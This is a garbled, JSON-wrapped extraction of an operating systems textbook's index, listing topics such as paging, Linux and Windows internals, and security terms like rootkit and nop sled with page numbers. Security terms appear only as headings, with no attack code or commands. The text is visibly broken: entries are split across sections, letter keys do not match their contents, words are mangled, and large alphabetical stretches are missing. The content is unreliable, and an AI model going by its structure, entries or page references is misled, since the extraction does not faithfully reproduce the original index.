AS/400, 609\r\nIBM PC, 15\r\nIC (see Integrated Circuit)\r\nIcon, 405\r\nIDE (see Integrated Drive Electronics)\r\nIdeal processor, Windows, 925\r\nIdempotent operation, 296\r\nIdentity theft, 661\r\nIDL (see Interface Definition Language)\r\nIDS (see Intrusion Detection System)\r\nIF (see Interrupt Flag)\r\nIIOP (see Internet InterOrb Protocol)\r\nImmediate file, 958\r\nImpersonation, 968\r\nImplementation, RPC, 557\r\nImplementation issues, paging, 233–240\r\nsegmentation, 243–252\r\nImplementation of an operating system,\r\n993–1010\r\nImplementation of I/O in Linux, 771–774\r\nImplementation of I/O in Windows, 948–952\r\nImplementation of memory management in\r\nLinux, 758–764\r\nImplementation of memory management in\r\nWindows, 933–942\r\nImplementation of processes, 94–95\r\nImplementation of processes in Linux,\r\n740–746\r\nImplementation of processes in Windows,\r\n919–927\r\nImplementation of security in Linux, 801–802\r\nImplementation of security in Windows,\r\n970–975\r\nImplementation of the file system in Linux,\r\n784–792\r\nImplementation of the NT file system in\r\nWindows, 954–964\r\nImplementation of the object manager in\r\nWindows, 894–896\r\nImplementing directories, 288–291\r\nImplementing files, 282–287\r\nImplicit intent, Android, 837\r\nImport address table, 906\r\nImprecise interrupt, 350–351\r\nIN instruction, 341\r\nIncremental dump, 307\r\nIndirect block, 324, 789–790\r\nIndirection, 1007\r\nIndium tin oxide, 415\r\nIndustry standard architecture, 32\r\nInfrastructure as a service, 496\r\nInit, 91, 809\r\nInitializeAcl, 970\r\nInitializeSecurityDescriptor, 970\r\nInitOnceExecuteOnce, 919, 977\r\nInode, 784\r\nInput software, 394–399\r\nInput/Output, 45\r\nInsider attacks, 657–660\r\nInstruction backup, 235–236\r\nInteger overflow attack, 654\r\nIntegrated circuit, 10\r\nIntegrated drive electronics, 369\r\nIntegrity checker, 691\r\nIntegrity level, 969\r\nIntegrity star property, 615\r\nIntegrity-level SID, 971\r\nIntent, Android, 836–837\r\nIntent resolution, 837\r\nInterconnection network, omega, 523–524\r\nperfect shuffle, 523\r\nInterconnection technology, 546\r\nInterface definition language, 582\r\nInterfaces to Linux, 724–725\r\nInterfacing for device drivers, 362–363\r\nInterleaved memory, 525\r\nInternal fragmentation, 226\r\nInternet, 571–572\r\nInternet interorb protocol, 583\r\nInternet protocol, 574, 770\r\nInterpretation, 700–701\r\nInterpreter, 475\r\nInterprocess communication, 40, 119–149\r\nWindows, 916–917\r\nInterrupt, 30, 347–351\r\nimprecise, 350–351\r\nprecise, 349–351\r\nInterrupt controller, 31\r\nInterrupt flag, 482\r\nInterrupt handler, 356–357\r\nInterrupt remapping, 491–492\n1084 INDEX\r\nInterrupt service routine, 883\r\nInterrupt vector, 31, 94, 348\r\nInterrupt-driven I/O, 354–355\r\nIntroduction to scheduling, 150\r\nIntruder, 599\r\nIntrusion detection system, 687, 695\r\nmodel-based, 695–697\r\nInvalid page, Windows, 929\r\nInverted page table, 207–208\r\nIoCallDrivers, 948–949\r\nIoCompleteRequest, 948, 961, 962\r\nIoctl, 770, 771\r\nIopParseDevice, 902, 903\r\niOS, 19\r\nIP (see Internet Protocol)\r\nIP address, 574\r\nIPC (see InterProcess Communication)\r\niPhone, 19\r\nIPSec, 619\r\nIris recognition, 637\r\nIRP (see I/O Request Packet)\r\nISA (see Industry Standard Architecture)\r\nISO 9660 file system, 326–331\r\nISR (see Interrupt Service Routine)\r\nITO (see Indium Tin Oxide)"
      },
      "J": {
        "page": 1115,
        "content": "J\r\nJacket (around system call), 110\r\nJailing, 694–695\r\nJava Dev elopment"
      },
      "K": {
        "page": 1115,
        "content": "Kit, 702\r\nJava security, 701\r\nJava Virtual Machine, 72, 700, 702\r\nJBD (see Journaling Block Device)\r\nJDK (see Java Dev elopment Kit)\r\nJiffy, 747\r\nJIT compilation (see Just-In-Time compilation)\r\nJob, 8\r\nWindows, 909–911\r\nJob management API calls, Windows, 914–919\r\nJobs, Steve, 16, 405\r\nJoliet extensions, 330–331\r\nJournal, 874\r\nJournaling, NTFS, 963\r\nJournaling block device, 791\r\nJournaling file system, 295, 295–296, 790–792\r\nJust-in-time compilation, 814\r\nJVM (see Java Virtual Machine)\r\nK\r\nKDE, 18\r\nKerckhoffs’ principle, 620\r\nKernel, Windows, 877, 882\r\nKernel handle, 897\r\nKernel lock, 533\r\nKernel mode, 1\r\nKernel rootkit, 680\r\nKernel thread, 997\r\nKernel-mode driver framework, 949\r\nKernel-space thread, 111–112\r\nKernel32.dll, 922\r\nKernighan, Brian, 715\r\nKe y\r\nobject type Windows, 894\r\nfile, 268\r\nKe y. cryptographic, 620\r\nKe yboard software, 394–398\r\nKe ylogger, 661\r\nKildall, Gary, 14–15\r\nKill, 54, 59, 91, 739\r\nKMDF (see Kernel-Mode Driver Framework)\r\nKqueues, 904\r\nKVM, 474"
      },
      "L": {
        "page": 1115,
        "content": "L\r\nL1 cache, 26\r\nL2 cache, 26\r\nLAN (see Local Area Network)\r\nLaptop mode, Linux, 767\r\nLarge scale integration, 15\r\nLarge-address-space operating system,\r\n1024–1025\r\nLate binding, 1001\r\nLayered system, 64, 993–994\r\nLayers of I/O software, 368\r\nLBA (see Logical Block Addressing)\r\nLDT (see Local Descriptor Table)\r\nLeast auhority, principle\r\nLeast recently used, simulation in software, 214\r\nLeast recently used page replacement algorithm,\r\n213–214, 935\r\nLeaveCriticalSection, 918\r\nLibrary rootkit, 681\r\nLicensing issues for virtual machines, 494–495\r\nLightweight process, 103\nINDEX 1085\r\nLimit register, 186\r\nLimits to clock speed, 517\r\nLinda, 584–587\r\nLine discipline, 774\r\nLinear address, 250\r\nLink, 54, 57, 58, 280, 783\r\nfile, 291, 777\r\nLinked lists for memory management, 192–194\r\nLinked-list allocation, 284\r\nLinked-list allocation using a table in memory,\r\n285\r\nLinker, 76\r\nLinux, 14, 713–802\r\nhistory, 720–722\r\noverview, 723–733\r\nLinux booting, 751\r\nLinux buddy algorithm, 762\r\nLinux dentry data structure, 784\r\nLinux elevator algorithm, 773\r\nLinux ext2 file system, 785–790\r\nLinux ext4 file system, 790–792\r\nLinux extensions for Android, 810–814\r\nLinux file system, 775–798\r\nimplementation, 784–792\r\nintroduction, 775–780\r\nLinux file-system calls, 780–783\r\nLinux goals, 723\r\nLinux header file, 730\r\nLinux I/O, 767–775\r\nimplementation, 771–774\r\nintroduction, 767–769\r\nLinux I/O scheduler, 773\r\nLinux I/O system calls, 770–771\r\nLinux interfaces, 724–725\r\nLinux journaling file system, 790–792\r\nLinux kernel structure, 731–733\r\nLinux layers, 724\r\nLinux laptop mode, 767\r\nLinux loadable module, 775–76\r\nLinux login, 752\r\nLinux memory allocation, 761–763\r\nLinux memory management, 753–767\r\nimplementation, 758–764\r\nintroduction, 754–756\r\nLinux memory management system calls,\r\n756–758\r\nLinux networking, 769–770\r\nLinux O(1) scheduler, 747\r\nLinux page replacement algorithm, 765–767\r\nLinux paging, 764–765\r\nLinux pipe, 735\r\nLinux process, 733–753\r\nimplementation, 740–746\r\nintroduction, 733–736\r\nLinux process creation, 735\r\nLinux process management system calls, 736–739\r\nLinux process scheduling, 746–751\r\nLinux processes, implementation, 740–746\r\nLinux runqueue, 747\r\nLinux security, 798–802\r\nimplementation, 801–802\r\nLinux security system calls, 801\r\nLinux signal, 735–736\r\nLinux slab allocator, 762\r\nLinux synchronization, 750–751\r\nLinux system call,\r\nfile-system calls, 780–783\r\nI/O, 770–771\r\nmemory management, 756–758\r\nprocess management, 736–739\r\nsecurity, 801\r\nLinux system calls (see Access, Alarm, Brk,\r\nChdir, Chmod, Chown, Clone, Close, Closedir,\r\nCreat, Exec, Exit, Fstat, Fsuid, Fsync, Getpid,\r\nIoctl, Kill, Link, Lseek,"
      },
      "M": {
        "page": 1117,
        "content": "M\r\nMac, 33\r\nMac OS X, 16\r\nMachine physical address, 488\r\nMachine simulator, 71\r\nMacro, 74\r\nMacro virus, 671\r\nMagic number, file, 269\r\nMagnetic disk, 369–371\r\nMailbox, 145\r\nMailslot, 916\r\nMainframe, 8\r\nMainframe operating system, 35\r\nMajor device, 768\r\nMajor device number, 363\r\nMajor page fault, 204\r\nMaking single-threaded code multithreaded,\r\n116–119\r\nMalloc, 652, 757\r\nMalware, 639, 660–684\r\nkeylogger, 661\r\nrootkit, 680–684\r\nspyware, 676–680\r\nTrojan horse, 663–664\r\nMalware (continued)\r\nvirus, 664–674\r\nworm, 674–676\r\nManaging free memory, 190–194\r\nMandatory access control, 612\r\nManycore chip, 528–529, 1023–1024\r\nMapped file, 231\r\nMapped page writer, 941\r\nMaroochy Shire sewage spill, 598\r\nMarshalling, 552, 557, 822\r\nMaster boot record, 281, 378, 751\r\nMaster file table, 954\r\nMaster-slave multiprocessor, 532–533\r\nMauchley, William, 7\r\nMBR (see Master Boot Record)\r\nMDL (see Memory Descriptor List)\r\nMechanism, 67\r\nMechanism vs. policy, 165, 997–998\r\nMemory, 24–27\r\ninterleaved, 525\r\nMemory compaction, 189\r\nMemory deduplication, 489, 494\r\nMemory descriptor list, 950\r\nMemory hierarchy, 181\r\nMemory management, 181–254\r\nLinux, 753–767\r\nWindows, 927–942\r\nMemory management algorithm\r\nbest fit algorithm, 193\r\nfirst fit, 192\r\nnext fit algorithm, 192\r\nquick fit algorithm, 193\r\nworst fit algorithm, 193\r\nMemory management API calls in Windows, 931–932\r\nMemory management system calls in Linux, 756\r\nMemory management unit, 28, 196\r\nI/O, 491\r\nMemory management with bitmaps, 191\r\nMemory management with linked lists, 192–194\r\nMemory management with overlays, 194\r\nMemory manager, 181, 889\r\nMemory migration, pre-copy, 497\r\nMemory overcommitment, 489\r\nMemory page, 194\r\nMemory pressure, 938\r\nMemory virtualization, 486–490\r\nMemory-allocation mechanism, Linux, 761–763\r\nMemory-mapped file, 756\r\nMemory-mapped I/O, 340–344\r\nMemory-resident virus, 669\nI"
      },
      "N": {
        "page": 1119,
        "content": "NDEX\r\nMultithreaded Web server, 100–101\r\nMultithreaded word processor, 99–100\r\nMultithreading, 23–24, 103\r\nMultitouch, 415\r\nMunmap, 757\r\nMurphy’s law, 120\r\nMutation engine, 690\r\nMutex, 132–134\r\nMutexes in Pthreads, 135–137\r\nMutual exclusion, 121\r\nbusy waiting, 124\r\ndisabling interrupts, 122–123\r\nlock variable, 123\r\nPeterson’s solution, 124–125\r\npriority inversion, 128\r\nsleep and wakeup, 127–130\r\nspin lock, 124\r\nstrict alternation, 123–124\r\nTSL instruction\r\nMutual exclusion with busy waiting, 122\r\nMythical man month, 1018–1019\r\nN\r\nNaming, 999–1001\r\nNaming transparency, 579–580\r\nNational Security Agency, 13\r\nNative NT, API, 868–871\r\nNC-NUMA (see Non Cache-coherent NUMA)\r\nNested page table, 488\r\nNetbook, 862\r\nNetwork, nonblocking, 522\r\nNetwork device, 774\r\nNetwork File System, 297, 792–798\r\nNetwork File System architecture, 792–793\r\nNetwork File System implementation, 795–798\r\nNetwork File System protocol, 794–795\r\nNetwork File System V4, 798\r\nNetwork hardware, 568–572\r\nNetwork interface, 548–550\r\nNetwork operating system, 18\r\nNetwork processor, 530, 549–550\r\nNetwork protocol, 574, 574–576\r\nNetwork services, 572–574\r\nNetworking, Linux, 769–770\r\nNext fit algorithm, 192\r\nNFS (seeNetwork File System)\r\nNFS implementation, 795\r\nNFU (see Not Frequently Used algorithm)\r\nNice, 747, 852\r\nNo memory abstraction, 181–185\r\nNode-to-network interface communication, 551–552\r\nNon cache-coherent NUMA, 525\r\nNonblocking call, 554–556\r\nNonblocking network, 522\r\nNoncanonical mode, 395\r\nNonce, 626\r\nNoncontrol-flow div erting attack, 648–649\r\nNonpreemptable resource, 437\r\nNonpreemptive scheduling, 153\r\nNonrepudability, 596\r\nNonresident attribute, 956\r\nNonuniform memory access, 520, 925\r\nNonvolatile RAM, 387\r\nNop sled, 642\r\nNot frequently used page replacement algorithm, 214\r\nNot recently used page replacement algorithm, 210–211\r\nNotification event, Windows, 918\r\nNotification object, 886\r\nNRU (see Not Recently Used page replacement)\r\nNSA (see National Security Agency)\r\nNT file system, 265–266\r\nNT namespace, 870\r\nNtAllocateVirtualMemory, 869\r\nNtCancelIoFile, 947\r\nNtClose, 900, 901\r\nNtCreateFile, 869, 901, 946, 947\r\nNtCreateProcess, 867, 869, 915, 922, 978, 979\r\nNtCreateThread, 869, 915\r\nNtCreateUserProcess, 916, 919, 920, 921, 922\r\nNtDeviceIoControlFile, 947\r\nNtDuplicate"
      },
      "O": {
        "page": 1120,
        "content": "O\r\nObCreateObjectType, 903\r\nObject, 582\r\nsecurity, 605\r\nObject adapter, 583\r\nObject cache, 762\r\nObject file, 75\r\nObject manager, 870, 888\r\nObject manager implementation, 894–896\r\nObject namespace, 898–905\r\nObject request broker, 582\r\nObject-based middleware, 582–584\r\nObOpenObjectByName, 901\r\nOff line operation, 9\r\nOmega network, 523–524\r\nOne-shot mode, clock, 389\r\nOne-time password, 631\r\nOne-way function, 609, 622\r\nOne-way hash chain, 631\r\nOntogeny recapitulates phylogeny, 47–50\r\nOpen, 54, 56, 57, 116, 272, 278, 297, 320, 333,\r\n366, 437, 443, 608, 696, 718, 768, 781,\r\n785, 786, 795, 796, 798\r\nOpen-file-description table, 789\r\nOpendir, 280\r\nOpenGL, 529\r\nOpenSemaphore, 897\r\nOperating system\r\nAndroid, 802–849\r\nBSD, 717–718\r\nembedded, 37\r\nguest, 477\r\nhandheld device, 36\r\nhistory, 6–20\r\nhost, 477\r\nLinux, 713–802\r\nmainframe, 35\r\nMD-DOS, 858\r\nMe, 859\r\nMINIX, 14, 66–68, 719–720, 775–776, 785–786\r\nmonolithic, 63–64\r\nMS-DOS, 858\r\nmultiprocessor, 36\r\nOS/2, 859"
      },
      "P": {
        "page": 1121,
        "content": "P\r\nP operation on semaphore, 130\r\nPAAS (see Platform As A Service)\r\nPackage manager, Android, 826\r\nPacket switching, 547–548\r\nPAE (see Physical Address Extension)\r\nPage, memory, 194, 196\r\nPage allocator, Linux, 761\r\nPage daemon, Linux, 764\r\nPage descriptor, Linux, 760\r\nPage directory, 207, 251\r\nPage directory pointer table, 207\r\nPage fault, 198\r\nguest-induced, 487\r\nhypervisor-induced, 487\r\nmajor, 204\r\nminor, 204\r\nPage fault frequency page replacement algorithm,\r\n224\r\nPage fault handling, 233–235\r\nPage frame, 196\r\nPage frame number, 200\r\nWindows, 939\r\nPage frame number database, Windows, 939\r\nPage frame reclaiming algorithm, 764, 765\r\nPage map level 4, 207\r\nPage replacement algorithm, 209–222\r\naging, 214\r\nclock, 212–213\r\nfirst-in, first-out, 211\r\nglobal, 223–224\r\nleast recently used, 213–214\r\nLinux, 765–767\r\nlocal, 222–223\r\nnot frequently used, 214\r\nnot recently used, 210–211\r\noptimal, 209–210\r\npage fault frequency, 224–225\r\nsecond-chance, 212\r\nsummary, 221\r\nWindows, 937–939\r\nworking set, 215\r\nWSClock, 219\r\nPage sharing, content-based, 494\r\ntransparent, 494\r\nPage size, 225–227\r\nPage table, 196–198, 198–201\r\nextended, 488\r\nlarge memory, 205–208\r\nmultilevel, 205–207\r\nnested, 488\r\nshadow, 486\r\nPage table entry, 199–201\r\nWindows, 937\r\nPage-fault handling, Windows, 934–937\r\nPage table walk, 204\r\nPagefile, Windows, 930–931\r\nPaging, 195–208\r\nalgorithms, 209–222\r\nbasics, 195–201\r\ncopy on write, 229\r\ndesign issues, 222–233\r\nfault handling, 233–235\r\nimplementation issues, 233–240\r\ninstruction backup, 235–236\r\nlarge memories, 205–208\r\nLinux, 764–765\r\nlocking pages, 237\r\nseparation of policy and mechanism, 239–240\r\nshared pages, 228–229\nINDEX 1091\r\nPaging daemon, 232\r\nParadigm, data, 989–991\r\noperating system, 987–993\r\nParallel bus architecture, 32\r\nParallels, 474\r\nParasitic virus, 668\r\nParavirt op, 485\r\nParavirtualization, 72, 476, 483\r\nParcel, Android, 821\r\nParent process, 90, 734\r\nParse routine, 898\r\nPartition, 59, 879\r\nPassive attack, 600\r\nPassword security, 628–632\r\nPassword strength, 628–629\r\nPatchguard, 974\r\nPath name, 43, 277–280\r\nabsolute, 277\r\nrelative, 278\r\nPause, 93, 739\r\nPC, 15\r\nPCI bus (see Peripheral Component Interconnect)\r\nPCIe (see Peripheral Component Interconnect\r\nExpress)\r\nPCR (see Platform Configuration Register)\r\nPDA (see Personal Digital Assistant)\r\nPDE (see Page-Directory Entry)\r\nPDP-1, 14\r\nPDP-11, 49\r\nPDP-11 UNIX, 715\r\nPEB (see Process Environment Block)\r\nPer-process items, 104\r\nPer-thread items, 104\r\nPerfect shuffle, 523\r\nPerformance, 1010–1018\r\ncaching, 1015–1016\r\nexploiting locality, 1017\r\nfile system, 314–319\r\nhints, 1016\r\noptimize the common case, 1017–1018\r\nspace-time trade-offs, 1012–1015\r\nPeriodic real-time system, 164\r\nPeripheral component interconnect, 32\r\nPeripheral component interconnect express, 32–33\r\nPersistence, file, 264\r\nPersonal computer operating system, 36\r\nPersonal digital assistant, 36\r\nPersonal firewall, 687\r\nPeterson’s algorithm, 124–125\r\nPF (see Physical Function)\r\nPFF (see Page Fault Frequency algorithm)\r\nPFN (see Page Frame Number)\r\nPFRA (see Page Frame Reclaiming Algorithm)\r\nPhase-change memory, 909\r\nPhysical address, guest, 488\r\nhost, 488\r\nPhysical address extension, 763\r\nPhysical dump, file system, 308\r\nPhysical function, 493\r\nPhysical memory management, Linux, 758–761\r\nWindows, 939–942\r\nPID (see Process IDentifier)\r\nPidgin Pascal, 137\r\nPinned memory, 759\r\nPinning pages in memory, 237\r\nPipe, 44, 782\r\nLinux, 735\r\nPipeline, 21\r\nPKI (see Public Key Infrastructure)\r\nPlaintext, 620\r\nPlatform as a service, 496\r\nPlatform configuration register, 625\r\nPLT (see Procedure Linkage Table)\r\nPlug and play, 33, 889\r\nPointer, 74\r\nPOLA (see Principle of Least Authority)\r\nPolicy, 67\r\nPolicy vs. mechanism, 165, 997–998\r\npaging, 239–240\r\nPolling, 354\r\nPolymorphic virus, 689–691\r\nPop-up thread, 114–115, 556\r\nPopek, Gerald, 474\r\nPort number, 686\r\nPortable C compiler, 716\r\nPortable UNIX, 716–717\r\nPortscan, 597\r\nPosition-independent code, 231\r\nPOSIX, 14, 50–62, 718\r\nPOSIX threads, 106–108\r\nPower management, 417–426\r\napplication issues, 425–426\r\nbattery, 424–425\r\nCPU, 421–423\r\ndisplay, 420\r\ndriver interface, 425\r\nhard disk, 420–421\r\nhardware issues, 418–419\r\nmemory, 423\r\noperating system issues, 419–425\n1092 INDEX\r\nPower management (continued)\r\nthermal management, 424\r\nWindows, 964–966\r\nwireless communication, 423–424\r\nPowerShell, 876\r\nPre-copy memory migration, 497\r\nPreamble, 340\r\nPrecise interrupt, 349–351\r\nPreemptable resource, 436\r\nPreemptive scheduling, 153\r\nPrepaging, 216\r\nPresent/absent bit, 197, 200\r\nPrimary volume descriptor, 327\r\nPrincipal, security, 605\r\nPrinciple of least authority, 603\r\nPrinciples of operating system design, 985–987\r\nPrinter daemon, 120\r\nPriority inversion, 128, 927\r\nPriority scheduling, 159–161\r\nPrivacy, 596, 598\r\nPrivileged instruction, 475\r\nProc file system, 792\r\nProcedure linkage table, 645\r\nProcess, 39–41, 85–173, 86\r\nblocked, 92\r\nCPU-bound, 152\r\nI/O-bound, 152\r\nimplementation, 94–95\r\nLinux, 740–746\r\nready, 92\r\nrunning, 92\r\nWindows, 908–927\r\nProcess behavior, 151–156\r\nProcess control block, 94\r\nProcess creation, 88–90\r\nProcess dependency, Android, 847\r\nProcess environment block, 908\r\nProcess group, Linux, 735\r\nProcess hierarchy, 91–92\r\nProcess ID, 53\r\nProcess identifier, Linux, 734\r\nProcess lifecycle, Android, 846\r\nProcess management API calls in Windows,\r\n914–919\r\nProcess management system calls, 53–56\r\nProcess management system calls in Linux,\r\n736–739\r\nProcess manager, 889\r\nProcess model, 86–88\r\nAndroid, 844\r\nProcess scheduling\r\nLinux, 746–751\r\nWindows, 922–927\r\nProcess state, 92\r\nProcess switch, 159\r\nProcess table, 39, 94\r\nProcess termination, 90–91\r\nProcess vs. program, 87\r\nProcess-level virtualization, 477\r\nProcesses in Linux, 733–753\r\nProcessor, 21–24\r\nProcessor allocation algorithm, 564–566\r\ngraph-theoretic, 564–565\r\nreceiver-initiated, 566\r\nsender-initiated, 565–566\r\nProcHandle, 869\r\nProducer-consumer problem, 128–132\r\nwith messages, 145–146\r\nwith monitors, 137–139\r\nwith semaphores, 130–132\r\nProgram counter, 21\r\nProgram status word, 21\r\nProgram vs. process, 87\r\nProgrammed I/O, 352–354\r\nProgramming with multiple cores, 530\r\nProject management, 1018–1022\r\nPrompt, 46\r\nProportionality, 155\r\nProtected process, 916\r\nProtection, file system, 45\r\nProtection command, 611\r\nProtection domain, 603–605\r\nProtection hardware, 48–49\r\nProtection mechanism, 596\r\nProtection ring, 479\r\nProtocol, 574\r\ncommunication, 460\r\nNFS, 794\r\nProtocol stack, 574\r\nPseudoparallelism, 86\r\nPSW (see Program Status Word)\r\nPTE (see Page Table Entry)\r\nPthreads, 106–108\r\nfunction calls, 107\r\nmutexes, 135–137\r\nPublic key infrastructure, 624\r\nPublic-key cryptography, 621–622\r\nPublish/subscribe, model, 586\r\nPulseEvent, 919\r\nPython, 73\nINDEX 1093"
      },
      "Q": {
        "page": 1124,
        "content": "Q\r\nQuality of service, 573\r\nQuantum, scheduling 158\r\nQueueUserAPC, 885\r\nQuick fit algorithm, 193"
      },
      "R": {
        "page": 1124,
        "content": "R\r\nR-node, NF"
      },
      "S": {
        "page": 1125,
        "content": "Shamir-Adelman cipher, 622\r\nRmdir, 54, 57, 783\r\nRock Ridge extensions, 329–331\r\nRole, ACL, 606\r\nRole of experience, 1021\r\nROM (see Read Only Memory)\r\nRoot, 800\r\nRoot directory, 43, 276\r\nRoot file system, 43\r\nRootkit, 680–684, application\r\nblue pill, 680\r\nfirmware, 680\r\nhypervisor, 680\r\nkernel, 680\r\nlibrary, 681\r\nSony, 683–684\r\nRootkit detection, 681–683\r\nROP (see Return-Oriented Programming)\r\nRound-robin scheduling, 158–159\r\nRouter, 461, 571\r\nRPC (see Remote Procedure Call)\r\nRSA cipher (see Rivest-Shamir-Adelman cipher)\r\nRunning process, 92\r\nRunqueue, Linux, 747\r\nRwx bit, 45\r\nS\r\nSAAS (see Software As A Service)\r\nSACL (see System Access Control List)\r\nSafe boot, 894\r\nSafe state, 452–453\r\nSafety, hypervisor, 475\r\nSalt, 630\r\nSAM (see Security Access Manager)\r\nSandboxing, 471, 698–700\r\nSA"
      },
      "T": {
        "page": 1128,
        "content": "TFS, 958–962\r\nStore manager, Windows, 941\r\nStore-and-forward packet switching, 547–548\r\nStored-value card, 634\r\nStrict alternation, 123–124\r\nStriping, RAID, 372\r\nStructure, operating system, 993–997\r\nStuxnet attack on nuclear facility, 598\r\nSubject, security, 605\r\nSubstitution cipher, 620\r\nSubsystem, 864\r\nSubsystems, Windows, 905–908\r\nSummary of page replacement algorithms, 221–22\r\nSuperblock, 282, 784, 785\r\nSuperFetch, 934\r\nSuperscalar computer, 22\r\nSuperuser, 41, 800\r\nSupervisor mode, 1\r\nSuspend blocker, Android, 810\r\nSvchost.exe, 907\r\nSVID (see System V Interface Definition)\r\nSVM (see Secure Virtual Machine)\r\nSwap area, Linux, 765\r\nSwap file, Windows, 942\r\nSwapper process, Linux, 764\r\nSwappiness, Linux, 766\r\nSwapping, 187–190\r\nSwitching multiprocessor, 523–525\r\nSwitchToFiber, 910\r\nSymbian, 19\r\nSymbolic link, 281, 291\r\nSymmetric multiprocessor, 533–534\r\nSymmetric-key cryptography, 620–621\r\nSync, 316, 317, 767\r\nSynchronization, barrier, 146–148\r\nLinux, 750–751\r\nmultiprocessor, 534–537\r\nWindows, 917–919\r\nSynchronization event, Windows, 918\r\nSynchronization object, 886\r\nSynchronization using semaphores, 132\r\nSynchronized method, Java, 143\r\nSynchronous call, 553–554\r\nSynchronous I/O, 352\r\nSynchronous vs. asynchronous communication,\r\n1004–1005\r\nSystem access control list, 969\r\nSystem bus, 20\r\nSystem call, 22, 50–62\r\nSystem-call interface, 991\r\nSystem calls (see also Windows API calls)\r\ndirectory management, 57–59\r\nfile management, 56–57\r\nLinux file system, 780–783\r\nLinux I/O, 770–771\r\nLinux memory management, 756–758\r\nLinux process management, 736–739\r\nLinux security, 801\r\nmiscellaneous, 59–60\r\nprocess management, 53–56\r\nSystem on a chip, 528\r\nSystem process, Windows, 914\r\nSystem structure, Windows, 877–908\r\nSystem V, 14\r\nSystem V interface definition, 718\r\nSystem/360, 10\r\nT\r\nTagged architecture, 608\r\nTask, Linux, 740\r\nTCB (see Trusted Computing Base)\r\nTCP (see Transmission Control Protocol)\r\nTCP/IP, 717\r\nTeam structure, 1019–1021\r\nTEB (see Thread Environment Block)\r\nTemplate, Linda, 585\r\nTermcap, 400\r\nTerminal, 394\r\nTerminal server, 927\r\nTerminateProcess, 91\r\nTest and set lock, 535\r\nTe xt segment, 56, 754\r\nTe xt window, 399–400\r\nTHE operating system, 64–65\r\nThermal management, 424\r\nThin client, 416–417\r\nThompson, Ken, 715\r\nTimer, high resolution, 747\r\nThrashing, 216\r\nThread, 97–119\r\nhybrid, 112–113\r\nkernel, 111–112\r\nLinux, 743–746\n1098 INDEX\r\nThread (continued)\r\nuser-space, 108–111\r\nWindows, 908–927\r\nThread environment block, 908\r\nThread local storage, 908\r\nThread management API calls in Windows, 914–919\r\nThread of execution, 103\r\nThread pool, Windows, 911–914\r\nThread scheduling, 166–167\r\nThread table, 109\r\nThread usage, 97–102\r\nThreads, POSIX, 106–108\r\nThreat, 596–598\r\nThroughput, 155\r\nTightly coupled distributed system, 519\r\nTime, 54, 60\r\nTime bomb, 658\r\nTime of check to time of use attack, 656–657\r\nTime of day, 390\r\nTime sharing, multiprocessor 540–542\r\nTimer, 388\r\nTimesharing, 12\r\nTinyOS, 37\r\nTLB (see Translation Lookaside Buffer)\r\nTOCTO"
      },
      "U": {
        "page": 1129,
        "content": "U (see Time Of Check to Time Of\r\nUse attack)\r\nToken, 874\r\nTop-down implementation, 1003–1004\r\nTop-down vs. bottom-up implementation, 1003–1004\r\nTopology, multicomputer, 547–549\r\nTorvalds, Linus, 14, 720\r\nTouch screen, 414–416\r\nTPM (see Trusted Platform Module)\r\nTrack, 28\r\nTransaction, Android, 817\r\nTransactional memory, 909\r\nTransfer model, 577–678\r\nTranslation lookaside buffer, 202–203, 226, 933,\r\nhard miss\r\nsoft miss, 204\r\nTransmission control protocol, 575, 770\r\nTransparent page sharing, 494\r\nTrap, 51–52\r\nTrap system call, 22\r\nTrap-and-emulate, 476\r\nTraps vs. binary translation, 482\r\nTrends in operating system design, 1022–1026\r\nTriple indirect block, 324, 790\r\nTrojan horse, 663–664\r\nTrueType fonts, 413\r\nTrusted computing base, 601\r\nTrusted platform module, 624–626\r\nTrusted system, 601\r\nTSL instruction, 126–127\r\nTuple, 584\r\nTuple space, 584\r\nTuring, Alan, 7\r\nTurnaround time, 155\r\nTw o-level multiprocessor scheduling, 541\r\nTw o-phase locking, 459\r\nType 1 hypervisor, 70, 477–478"
      },
      "V": {
        "page": 1130,
        "content": "V\r\nV operation on semaphore, 130\r\nV-node, NFS, 795\r\nVAD (see Virtual Address Descriptor)\r\nValidDataLength, 943\r\nVampire tap, 569\r\nVendor lock-in, 496\r\nVertical integration, 500\r\nVFS (see Virtual File System)\r\nVFS interface, 297\r\nVideo RAM, 340, 405\r\nVirtual address, 195\r\nguest, 488\r\nVirtual address allocation,"
      },
      "W": {
        "page": 1131,
        "content": "Workstation, 498–500\r\nLinux, 498\r\nWindows, 498\r\nVM"
      },
      "X": {
        "page": 1132,
        "content": "X 1101\r\nWindows IPC, 916–917\r\nWindows job, 909–911\r\nWindows kernel, 882\r\nWindows Me, 17, 859\r\nWindows memory management, 927–942\r\nimplementation, 933–942\r\nintroduction, 928–931\r\nWindows memory management API calls, 931–932\r\nWindows metafile, 412\r\nWindows notification facility, 890\r\nWindows NT, 16, 860\r\nWindows NT 4.0, 861, 891\r\nWindows NT file system, 265–266, 952–964\r\nintroduction, 952–954\r\nimplementation, 954–964\r\nWindows page replacement algorithm, 937–939\r\nWindows page-fault handling, 934–937\r\nWindows pagefile, 930–931\r\nWindows power management, 964–966\r\nWindows process, introduction, 908–914\r\nWindows process management API calls, 914–919\r\nWindows process scheduing, 922–927\r\nWindows processes, 908–927\r\nintroduction, 908–914\r\nimplementation, 919–927\r\nWindows programming model, 864–877\r\nWindows registry, 875–877\r\nWindows security, 966–975\r\nimplementation, 970–975\r\nintroduction, 967–969\r\nWindows security API calls, 969–970\r\nWindows subsystems, 905–908\r\nWindows swap file, 942\r\nWindows synchronization, 917–919\r\nWindows synchronization event, 918\r\nWindows system process, 914\r\nWindows system structure, 877–908\r\nWindows thread, 908–927\r\nWindows thread pool, 911–914\r\nWindows threads, implementation, 919–927\r\nWindows update, 974\r\nWindows Vista, 17, 862–863\r\nWindows XP, 17, 861\r\nWindows-on-Windows, 872\r\nWinRT, 865\r\nWinTel, 500\r\nWMware Workstation, evolution, 511\r\nWndProc, 409\r\nWNF (see Windows Notification Facility)\r\nWorker thread, 100\r\nWorking directory, 43, 278, 777\r\nWorking set, 216\r\nWorking set model, 216\r\nWorking set page replacement algorithm, 215\r\nWorld switch, 482, 510\r\nWorm, 595, 674–676\r\nMorris, 674–676\r\nWormhole routing, 548\r\nWorst fit algorithm, 193\r\nWOW (see Windows-on-Windows)\r\nWrapper (around system call), 110\r\nWrite, 54, 57, 273, 275, 297, 298, 317, 364, 367,\r\n580, 603, 696, 756, 767, 768, 770, 781, 782,\r\n785, 791, 797, 802\r\nWrite-through cache, 317\r\nWSClock page replacement algorithm, 219\r\nWˆX, 644\r\nX\r\nX, 401–405\r\nX client, 